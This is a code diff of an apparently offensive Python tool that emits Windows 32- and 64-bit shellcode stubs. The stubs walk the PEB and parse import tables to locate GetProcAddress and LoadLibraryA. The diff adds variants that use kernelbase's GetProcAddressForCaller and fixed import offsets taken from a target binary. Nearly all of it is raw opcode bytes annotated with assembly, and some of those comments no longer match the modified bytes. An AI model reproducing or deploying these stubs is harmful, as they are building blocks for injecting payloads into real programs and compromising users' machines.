@@ -99,17 +99,20 @@ parser.add_argument('-o', '--output', dest="OUTPUT", action="store", default='st
 parser.add_argument("-p", "--parser_stub", dest="parser_stub", action="store", default='GPA', 
                     help="""By default this assumes that GetProcAddress (GPA) is in the targetbinary's
 Import Address Table (IAT) if no targetbinary or DLL name is provided.
-Four options:
+Seven options:
     GPA  - GPA is in targetbinary IAT (default)
     LLAGPA - LoadlibraryA(LLA)/GPA is in the targetbinary IAT (smallest shellcode option)
     ExternGPA -- need DLLName or targetbinary to use
     ExternLLAGPA -- need DLLName or targetbinary to use
+    ExternGPAFC -- -d kernel32.dll -l kernelbase.dll  # only works on win8 - win10
+    OffsetGPA -- -b target.EXE # static offset to that version of software (target EXE)
+    ExternOffsetGPA -- -b target.DLL -d import_dll # static offset to that version of software (target DLL)
                     """
                     )
 parser.add_argument('-n', '--donotfail', dest='dontfail', action='store_true', default=False,
                     help='Default: Fail if Stephen Fewers Hash API stub is not there, use -n to bypass')
 parser.add_argument('-M', '--mode', default='', dest='mode', action='store',
-                    help='ASM mode 32 or 64')
+                    help='ASM mode 32 or 64, usually automatic')
 
 args = parser.parse_args()
 
@@ -129,7 +132,34 @@ class stubs_32:
 
     def __init__(self, impts):
         self.impts = impts
+        self.imp_offset = 0
+
+    def check_imports(self):
+        ####################################
+        #### Parse imports via pefile ######
+
+        #make this option only if a IAT based shellcode is selected
+        pe = pefile.PE(self.impts.targetbinary, fast_load=True)
+        sys.stderr.write("[*] Parsing data directories...\n")
+        pe.parse_data_directories()
         
+        try: 
+            for entry in pe.DIRECTORY_ENTRY_IMPORT:
+                for imp in entry.imports:
+                    if imp.name is None:
+                        continue
+                    if imp.name.lower() == b'GetProcaddress'.lower():
+                        self.imp_offset = imp.address - pe.OPTIONAL_HEADER.ImageBase
+                        sys.stderr.write("[*] GPA offset: {0}\n".format(hex(self.imp_offset))) 
+        
+                    # Easter egg???
+                    #if imp.name.lower() == b'GetProcaddressforcaller'.lower():
+                    #    self.imp_offset =  imp.address - pe.OPTIONAL_HEADER.ImageBase
+                    #    sys.stderr.write("[*] GPAFC offset: {0}\n".format(hex(self.imp_offset))) 
+        
+        except Exception as e:
+            sys.stderr.write("Exception: {0}\n".format(e))
+
     def lla_gpa_parser_stub(self):
         self.parser_stub = 'LLAGPA'
         self.importname = 'main_module'
@@ -383,7 +413,7 @@ class stubs_32:
             shellcode3 += (
            b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
            b"\x75\x09"
-           b"\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+           b"\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
            b"\x74\x05"
            b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
            b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
@@ -507,7 +537,7 @@ class stubs_32:
             shellcode3 += (
            b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
            b"\x75\x09"
-           b"\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+           b"\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
            b"\x74\x05"
            b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
            b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
@@ -602,14 +632,334 @@ class stubs_32:
     
         return shellcode1 + shellcode2 + shellcode3
 
-    #add gpafc stub here
+    def loaded_gpafc_iat_parser_stub(self):
+        self.parser_stub = 'ExternGPAFC'
+        
+        shellcode1 = bytes("\xfc"                   # cld
+            "\x60"                                  # pushad
+            "\x31\xd2"                              # xor edx,edx
+            "\x64\x8b\x52\x30"                      # mov edx,[fs:edx+0x30]     ; PEB
+            "\x8b\x52\x0c"                          # mov edx,[edx+0xc]         ; PEB_LDR_DATA 
+            "\x8b\x52\x14"                          # mov edx,[edx+0x14]        ; ptr Flink Linked List in InMemoryOrderModuleList
+            # next_mod
+            "\x8b\x72\x28"                          # mov esi,[edx+0x28]        ; Points to UTF-16 module name in LDR_MODULE
+            "\x6a\x18"                              # push byte +0x18           ; Set loop counter length
+            "\x59"                                  # pop ecx                   ; Set loop counter length
+            "\x31\xff"                              # xor edi,edi               ; clear edi to 0
+            # loop_modnam
+            "\x31\xc0"                              # xor eax,eax               ; clear eax to 0
+            "\xac"                                  # lodsb                     ; load last to esi
+            "\x3c\x61"                              # cmp al,0x61               ; check for capitalization
+            "\x7c\x02"                              # jl 0x20                   ; if < 0x61 jump
+            "\x2c\x20"                              # sub al,0x20               ; capitalize the letter
+            # not_lowercase
+            "\xc1\xcf\x0d"                          # ror edi,byte 0xd          ; rotate edi right 0xd bits
+            "\x01\xc7"                              # add edi,eax               ; add sum to edi
+            "\xe2\xf0"                              # loop 0x17                 ; continue until loop ends
+            , "iso-8859-1")
+        
+        shellcode2 = b"\x81\xff"                    # cmp edi, DLL_HASH
+        shellcode2 += struct.pack("<I", self.impts.DLL_INFO['hash'])                          
+    
+    
+        shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
+            "\x8b\x12"                              # mov edx,[edx]             ; set edx base for next module interation
+            "\x75\xdb"                              # jnz 0xf
+            # iatparser         
+            "\x89\xda"                              # mov edx,ebx               ; set as edx as image base
+            "\x03\x52\x3c"                          # add edx,[edx+0x3c]        ; PE
+            "\x8b\xba\x80\x00\x00\x00"              # mov edi,[edx+0x80]        ; Import Table RVA
+            "\x01\xdf"                              # add edi,ebx
+            # findImport
+            "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
+            "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
+            , 'iso-8859-1')                            
+        
+        if self.impts.DLL_INFO['importname'] == 'kernelbase.dll': #it's actually in kernelbase
+            shellcode3 += (
+           b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+           b"\x75\x09"                               # JE short 
+           b"\x81\x7A\x04\x45\x4C\x42\x41"           # CMP DWORD PTR DS:[EDX+4],41424C45     ; elba
+           b"\x74\x05"                               # je 0x102f                             ; jmp saveBase
+           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
+           b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
+           )
 
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
+            sys.exit(-1)
+
+        shellcode3 += bytes(
+            # saveBase
+            "\x57"                                  # push edi
+            "\xeb\x39"                              # jmp short 0x9f
+            # setbounds         
+            "\x8b\x57\x10"                          # mov edx,[edi+0x10]
+            "\x01\xda"                              # add edx,ebx
+            "\x8b\x37"                              # mov esi,[edi]
+            "\x01\xde"                              # add esi,ebx
+            "\x89\xd1"                              # mov ecx,edx   
+            "\x81\xc1\x00\x00\xff\x00"              #  add ecx,0xff0000     
+            "\x31\xed"                              #  xor ebp,ebp
+            # findApi           
+            "\x8b\x06"                              #  mov eax,[esi]
+            "\x01\xd8"                              #  add eax,ebx
+            "\x83\xc0\x02"                          #  add eax,byte +0x2
+            "\x39\xc1"                              #  cmp ecx,eax
+            "\x72\x13"                              #  jc 0x97
+            "\x8b\x7c\x24\x04"                      #  mov edi,[esp+0x4]
+            "\x39\x38"                              #  cmp [eax],edi
+            "\x75\x0b"                              #  jnz 0x97
+            "\x3e\x8b\x7c\x24\x08"                  #  mov edi,[ds:esp+0x8]
+            "\x39\x78\x08"                          #  cmp [eax+0x8],edi
+            "\x75\x01"                              #  jnz 0x97
+            "\xc3"                                  #  ret
+            # Increment         
+            "\x83\xc5\x04"                          #  add ebp,byte +0x4
+            "\x83\xc6\x04"                          #  add esi,byte +0x4
+            "\xeb\xda"                              #  jmp short 0x77
+            # loadApis
+            "\x68\x64\x64\x72\x65"                  # push 0x65726464                       ;ddre
+            "\x68\x47\x65\x74\x50"                  # push 0x50746547                       ;Getp
+            "\xe8\xb8\xff\xff\xff"                  # call 0x1032        å                   ;call setBounds
+            "\x03\xd5"                              # add edx, ebp                          ;
+            "\x5d"                                  # pop ebp                               ;
+            "\x5d"                                  # pop ebp                               ;
+            "\x8b\xca"                              # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
+            , 'iso-8859-1')
+                    #GPA in ECX
+        shellcode3 += b"\x89\xCD"                   # mov ebp, ecx GPA in EBP
+        shellcode3 += bytes("\x31\xd2"              # xor    edx,edx
+            "\x64\x8b\x52\x30"                      # mov    edx,DWORD PTR fs:[edx+0x30]
+            "\x8b\x52\x0c"                          # mov    edx,DWORD PTR [edx+0xc]
+            "\x8b\x52\x14"                          # mov    edx,DWORD PTR [edx+0x14]
+            "\x8b\x72\x28"                          # mov    esi,DWORD PTR [edx+0x28]
+            "\x6a\x18"                              # push   0x18
+            "\x59"                                  # pop    ecx
+            "\x31\xff"                              # xor    edi,edi
+            "\x31\xc0"                              # xor    eax,eax
+            "\xac"                                  # lods   al,BYTE PTR ds:[esi]
+            "\x3c\x61"                              # cmp    al,0x61
+            "\x7c\x02"                              # jl     0x20
+            "\x2c\x20"                              # sub    al,0x20
+            "\xc1\xcf\x0d"                          # ror    edi,0xd
+            "\x01\xc7"                              # add    edi,eax
+            "\xe2\xf0"                              # loop   0x17
+            "\x81\xff\x5b\xbc\x4a\x6a"              # cmp    edi,0x6a4abc5b
+            "\x8b\x5a\x10"                          # mov    ebx,DWORD PTR [edx+0x10]
+            "\x8b\x12"                              # mov    edx,DWORD PTR [edx]
+            "\x75\xdb"                              # jne    0xf
+            , 'iso-8859-1')
+    
+        # kernel32.dll in ebx
+        shellcode3 += bytes("\x6A\x00"              # push 0
+            "\x68\x61\x72\x79\x41"                  # push LoadLibraryA\x00
+            "\x68\x4c\x69\x62\x72"              
+            "\x68\x4c\x6f\x61\x64"
+            "\x8B\xcc"                              # mov ecx, esp
+            "\x6A\x00"                              # push 0 ; for the getprocaddressforcaller prototype             
+            "\x51"                                  # push ecx ; push ptr to loadlibrary on the stack
+            #"\x54"                                 # push esp
+            "\x53"                                  # push ebx (kernel32.dll handle)
+            "\x89\xE9"                              # mov ecx,ebp getprocaddr
+            "\xFF\x11"                              # call dword ptr [ecx]  # call dword ptr [ecx] 
+            "\x50"                                  # push eax ; LLA in EAX
+            "\x89\xe3"                              # mov ebx, esp ; mov ptr to LLA in ebx
+            "\x58"                                  # pop eax, to align stack
+            "\x58"                                  # pop eax, to align stack
+            "\x58"                                  # pop eax, to align stack
+            "\x58"                                  # pop eax, to align stack
+            "\x58"                                  # pop eax, to align stack
+            "\x58"                                  # pop eax, to align stack
+
+                       , 'iso-8859-1')
+        # LOADLIBA in EBX
+        # GETPROCADDR in EBP
+    
+        return shellcode1 + shellcode2 + shellcode3
+
+    def OffsetGPA(self):
+        self.parser_stub = 'GPA'
+        self.importname = 'main_module'
+        self.check_imports()
+
+        shellcode = bytes( "\xfc"
+               "\x60"                               # pushad
+               "\x31\xd2"                           # xor edx, edx                          ;prep edx for use
+               "\x64\x8b\x52\x30"                   # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
+               "\x8b\x52\x08"                       # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
+               "\x8b\xda"                           # mov ebx, edx                          ;Set ebx to imagebase
+               "\xb9"                               # mov ecx, XXXX
+                , 'iso-8859-1'
+                )
+                #mov ecx, imp_offset
+                #add ecx, ebx 
+        shellcode += struct.pack('<I', self.imp_offset)
+
+               # GPA in ECX
+        shellcode += bytes(
+               "\x01\xD9"                           # add ecx, ebx
+               "\x89\xCD" # mov ebp, ecx            # mov GPA to ebp
+               "\x31\xd2"                           # xor    edx,edx
+               "\x64\x8b\x52\x30"                   # mov    edx,DWORD PTR fs:[edx+0x30]
+               "\x8b\x52\x0c"                       # mov    edx,DWORD PTR [edx+0xc]
+               "\x8b\x52\x14"                       # mov    edx,DWORD PTR [edx+0x14]
+               "\x8b\x72\x28"                       # mov    esi,DWORD PTR [edx+0x28]
+               "\x6a\x18"                           # push   0x18
+               "\x59"                               # pop    ecx
+               "\x31\xff"                           # xor    edi,edi
+               "\x31\xc0"                           # xor    eax,eax
+               "\xac"                               # lods   al,BYTE PTR ds:[esi]
+               "\x3c\x61"                           # cmp    al,0x61
+               "\x7c\x02"                           # jl     0x20
+               "\x2c\x20"                           # sub    al,0x20
+               "\xc1\xcf\x0d"                       # ror    edi,0xd
+               "\x01\xc7"                           # add    edi,eax
+               "\xe2\xf0"                           # loop   0x17
+               "\x81\xff\x5b\xbc\x4a\x6a"           # cmp    edi,0x6a4abc5b
+               "\x8b\x5a\x10"                       # mov    ebx,DWORD PTR [edx+0x10]
+               "\x8b\x12"                           # mov    edx,DWORD PTR [edx]
+               "\x75\xdb"                           # jne    0xf
+               # kernel32.dll in ebx
+               "\x6A\x00"                           # push 0
+               "\x68\x61\x72\x79\x41"               # push LoadLibraryA\x00
+               "\x68\x4c\x69\x62\x72"           
+               "\x68\x4c\x6f\x61\x64"           
+               "\x54"                               # push esp
+               "\x53"                               # push ebx (kernel32.dll handle)
+               "\x89\xE9"                           # mov ecx,ebp getprocaddr
+               "\xFF\x11"                           # call dword ptr [ecx]  # call dword ptr [ecx] 
+               "\x50"                               # push eax ; LLA in EAX
+               "\x89\xe3"                           # mov ebx, esp ; mov ptr to LLA in ebx
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               
+               , 'iso-8859-1')
+        return shellcode 
+
+    def ExternOffsetGPA(self):
+        self.parser_stub = 'GPA'
+        self.importname = 'main_module'
+        self.check_imports()
+
+        shellcode = bytes("\xfc"                   # cld
+            "\x60"                                  # pushad
+            "\x31\xd2"                              # xor edx,edx
+            "\x64\x8b\x52\x30"                      # mov edx,[fs:edx+0x30]     ; PEB
+            "\x8b\x52\x0c"                          # mov edx,[edx+0xc]         ; PEB_LDR_DATA 
+            "\x8b\x52\x14"                          # mov edx,[edx+0x14]        ; ptr Flink Linked List in InMemoryOrderModuleList
+            # next_mod
+            "\x8b\x72\x28"                          # mov esi,[edx+0x28]        ; Points to UTF-16 module name in LDR_MODULE
+            "\x6a\x18"                              # push byte +0x18           ; Set loop counter length
+            "\x59"                                  # pop ecx                   ; Set loop counter length
+            "\x31\xff"                              # xor edi,edi               ; clear edi to 0
+            # loop_modnam
+            "\x31\xc0"                              # xor eax,eax               ; clear eax to 0
+            "\xac"                                  # lodsb                     ; load last to esi
+            "\x3c\x61"                              # cmp al,0x61               ; check for capitalization
+            "\x7c\x02"                              # jl 0x20                   ; if < 0x61 jump
+            "\x2c\x20"                              # sub al,0x20               ; capitalize the letter
+            # not_lowercase
+            "\xc1\xcf\x0d"                          # ror edi,byte 0xd          ; rotate edi right 0xd bits
+            "\x01\xc7"                              # add edi,eax               ; add sum to edi
+            "\xe2\xf0"                              # loop 0x17                 ; continue until loop ends
+            , "iso-8859-1")
+        
+        shellcode += b"\x81\xff"                    # cmp edi, DLL_HASH
+        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])                          
+    
+    
+        shellcode += bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
+            "\x8b\x12"                              # mov edx,[edx]             ; set edx base for next module interation
+            "\x75\xdb"                              # jnz 0xf
+            # iatparser         
+            "\x89\xda"                              # mov edx,ebx               ; set as edx as image base
+            "\xb9"                               # mov ecx, XXXX
+                , 'iso-8859-1'
+                )
+                #mov ecx, imp_offset
+                #add ecx, ebx 
+        shellcode += struct.pack('<I', self.imp_offset)
+
+               # GPA in ECX
+        shellcode += bytes(
+               "\x01\xD9"                           # add ecx, ebx
+               "\x89\xCD" # mov ebp, ecx            # mov GPA to ebp
+               "\x31\xd2"                           # xor    edx,edx
+               "\x64\x8b\x52\x30"                   # mov    edx,DWORD PTR fs:[edx+0x30]
+               "\x8b\x52\x0c"                       # mov    edx,DWORD PTR [edx+0xc]
+               "\x8b\x52\x14"                       # mov    edx,DWORD PTR [edx+0x14]
+               "\x8b\x72\x28"                       # mov    esi,DWORD PTR [edx+0x28]
+               "\x6a\x18"                           # push   0x18
+               "\x59"                               # pop    ecx
+               "\x31\xff"                           # xor    edi,edi
+               "\x31\xc0"                           # xor    eax,eax
+               "\xac"                               # lods   al,BYTE PTR ds:[esi]
+               "\x3c\x61"                           # cmp    al,0x61
+               "\x7c\x02"                           # jl     0x20
+               "\x2c\x20"                           # sub    al,0x20
+               "\xc1\xcf\x0d"                       # ror    edi,0xd
+               "\x01\xc7"                           # add    edi,eax
+               "\xe2\xf0"                           # loop   0x17
+               "\x81\xff\x5b\xbc\x4a\x6a"           # cmp    edi,0x6a4abc5b
+               "\x8b\x5a\x10"                       # mov    ebx,DWORD PTR [edx+0x10]
+               "\x8b\x12"                           # mov    edx,DWORD PTR [edx]
+               "\x75\xdb"                           # jne    0xf
+               # kernel32.dll in ebx
+               "\x6A\x00"                           # push 0
+               "\x68\x61\x72\x79\x41"               # push LoadLibraryA\x00
+               "\x68\x4c\x69\x62\x72"           
+               "\x68\x4c\x6f\x61\x64"           
+               "\x54"                               # push esp
+               "\x53"                               # push ebx (kernel32.dll handle)
+               "\x89\xE9"                           # mov ecx,ebp getprocaddr
+               "\xFF\x11"                           # call dword ptr [ecx]  # call dword ptr [ecx] 
+               "\x50"                               # push eax ; LLA in EAX
+               "\x89\xe3"                           # mov ebx, esp ; mov ptr to LLA in ebx
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               "\x58"                               # pop eax, to align stack
+               
+               , 'iso-8859-1')
+        return shellcode 
 
 class stubs_64:
 
     def __init__(self, impts):
         self.impts = impts
+        self.imp_offset = 0
     
+    def check_imports(self):
+        ####################################
+        #### Parse imports via pefile ######
+
+        #make this option only if a IAT based shellcode is selected
+        pe = pefile.PE(self.impts.targetbinary, fast_load=True)
+        sys.stderr.write("[*] Parsing data directories...\n")
+        pe.parse_data_directories()
+        
+        try: 
+            for entry in pe.DIRECTORY_ENTRY_IMPORT:
+                for imp in entry.imports:
+                    if imp.name is None:
+                        continue
+                    if imp.name.lower() == b'GetProcaddress'.lower():
+                        self.imp_offset = imp.address - pe.OPTIONAL_HEADER.ImageBase
+                        sys.stderr.write("[*] GPA offset: {0}\n".format(hex(self.imp_offset))) 
+        
+                    # Easter Egg?
+                    #if imp.name.lower() == b'GetProcaddressforcaller'.lower():
+                    #    self.imp_offset =  imp.address - pe.OPTIONAL_HEADER.ImageBase
+                    #    sys.stderr.write("offset: {0}\n".format(hex(self.imp_offset))) 
+        
+        except Exception as e:
+            sys.stderr.write("Exception: {0}\n".format(e))
+
     def lla_gpa_parser_stub(self):
         parser_stub = 'LLAGPA'
         importname = 'main_module'
@@ -692,7 +1042,7 @@ class stubs_64:
         return shellcode
 
     def gpa_parser_stub(self):
-        parser_stub = 'LLAGPA'
+        parser_stub = 'GPA'
         importname = 'main_module'
 
         shellcode = bytes(
@@ -858,7 +1208,7 @@ class stubs_64:
                     
                     "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
                     "\x75\x09"                                          # jne 0x79
-                    "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+                    "\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
                     "\x74\x06"                                          # je 0x7f
                     "\x48\x83\xc7\x14"                                  # add rdi, 0x14
                     "\xeb\xe2"                                          # jmp 0x62
@@ -989,7 +1339,7 @@ class stubs_64:
                     
             "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
             "\x75\x09"                                          # jne 0x79
-            "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+            "\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
             "\x74\x06"                                          # je 0x7f
             "\x48\x83\xc7\x14"                                  # add rdi, 0x14
             "\xeb\xe2"                                          # jmp 0x62
@@ -1071,6 +1421,301 @@ class stubs_64:
         
         return shellcode
 
+    def loaded_gpafc_iat_parser_stub(self):
+        self.parser_stub = 'ExternGPAFC'
+        
+        shellcode = bytes(
+            "\xfc"                                              # cld 
+            "\x52"                                              # push rdx
+            "\x51"                                              # push rcx
+            "\x57"                                              # push rdi
+            "\x53"                                              # push rbx
+            "\x56"                                              # push rsi
+            "\x41\x50"                                          # push r8
+            "\x41\x51"                                          # push r9
+            "\x41\x54"                                          # push r12
+            "\x41\x55"                                          # push r13
+            "\x41\x56"                                          # push r14
+            "\x41\x57"                                          # push r15
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x37
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0x2d
+            , 'iso-8859-1'
+            )
+        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
+        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
+        
+        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0x23
+            "\x4c\x89\xea"                                      # mov rdx, r13
+            "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
+            "\x48\x01\xc2"                                      # add rdx, rax
+            "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
+            "\x4c\x01\xef"                                      # add rdi, r13
+            "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
+            "\x4c\x01\xea"                                      # add rdx, r13
+            , 'iso-8859-1'
+            )
+        if self.impts.DLL_INFO['importname'] == 'kernelbase.dll':
+            shellcode += bytes(
+            "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
+            "\x75\x09"                                          # jne 0x79
+            "\x81\x7a\x04\x45\x4c\x42\x41"                      # cmp dword ptr [rdx + 4], 0x32334c45
+            "\x74\x06"                                          # je 0x7f
+            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+            "\xeb\xe3"                                          # jmp 0x62
+            , 'iso-8859-1'
+            )
+        
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
+            sys.exit(-1)
+        shellcode += bytes(
+            "\x57"                                              # push rdi
+            "\xeb\x47"                                          # jmp 0xc9
+            "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
+            "\x4c\x01\xea"                                      # add rdx, r13
+            "\x8b\x37"                                          # mov esi, dword ptr [rdi]
+            "\x4c\x01\xee"                                      # add rsi, r13
+            "\x48\x89\xd1"                                      # mov rcx, rdx
+            "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
+            "\x4d\x31\xdb"                                      # xor r11, r11
+            "\x8b\x06"                                          # mov eax, dword ptr [rsi]
+            "\x4c\x01\xe8"                                      # add rax, r13
+            "\x48\x83\xc0\x02"                                  # add rax, 2
+            "\x48\x39\xc1"                                      # cmp rcx, rax
+            "\x72\x17"                                          # jb 0xbf
+            "\x48\x39\xd0"                                      # cmp rax, rdx
+            "\x72\x12"                                          # jb 0xbf
+            "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
+            "\x39\x38"                                          # cmp dword ptr [rax], edi
+            "\x75\x0a"                                          # jne 0xbf
+            "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
+            "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
+            "\x75\x01"                                          # jne 0xbf
+            "\xc3"                                              # ret 
+            "\x41\x83\xc3\x04"                                  # add r11d, 4
+            "\x48\x83\xc6\x04"                                  # add rsi, 4
+            "\xeb\xd1"                                          # jmp 0x9a
+            "\x68\x64\x64\x72\x65"                              # push 0x65726464
+            "\x68\x47\x65\x74\x50"                              # push 0x50746547
+            "\xe8\xaa\xff\xff\xff"                              # call 0x82
+            "\x4c\x01\xda"                                      # add rdx, r11
+            "\x59"                                              # pop rcx
+            "\x59"                                              # pop rcx
+            "\x49\x89\xd7"                                      # mov r15, rdx
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x104
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0xfa
+            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
+            "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0xf0
+            "\x6a\x00"                                          # push 0
+            "\x6a\x00"                                          # push 0
+            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
+            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
+            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
+            "\x4D\x31\xC0"                                      # xor r8, r8
+            "\x48\x89\xe2"                                      # mov rdx, rsp
+            "\x4c\x89\xe9"                                      # mov rcx, r13
+            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
+            "\x4d\x89\xd5"                                      # mov r13, r10
+            "\x41\xff\x17"                                      # call qword ptr [r15]
+            "\x50"                                              # push rax
+            "\x49\x89\xe6"                                      # mov r14, rsp
+            "\x4d\x89\xea"                                      # mov r10, r13
+            "\x48\x83\xc4\x40"                                  # add rsp, 0x70
+            , 'iso-8859-1'
+            )
+        
+        return shellcode
+
+    def OffsetGPA(self):
+        parser_stub = 'offset'
+        importname = 'main_module'
+        self.check_imports()
+        
+        shellcode = bytes(
+            "\xfc"                                              # cld 
+            "\x52"                                              # push rdx
+            "\x51"                                              # push rcx
+            "\x57"                                              # push rdi
+            "\x53"                                              # push rbx
+            "\x56"                                              # push rsi
+            "\x41\x50"                                          # push r8
+            "\x41\x51"                                          # push r9
+            "\x41\x54"                                          # push r12
+            "\x41\x55"                                          # push r13
+            "\x41\x56"                                          # push r14
+            "\x41\x57"                                          # push r15
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
+            "\x49\x89\xd5"                                      # mov r13, rdx
+            "\x48\xc7\xc3"                                      # mov rbx,
+            , 'iso-8859-1'
+            )
+        shellcode += struct.pack("<I", self.imp_offset)   #  XXXXX
+                  
+        shellcode +=  bytes("\x4c\x01\xeb"                                      # add rbx, r13
+            "\x49\x89\xdf"                                      # mov r15, rbx
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x53
+            "\x2c\x20"                                          # sub al, 0x20
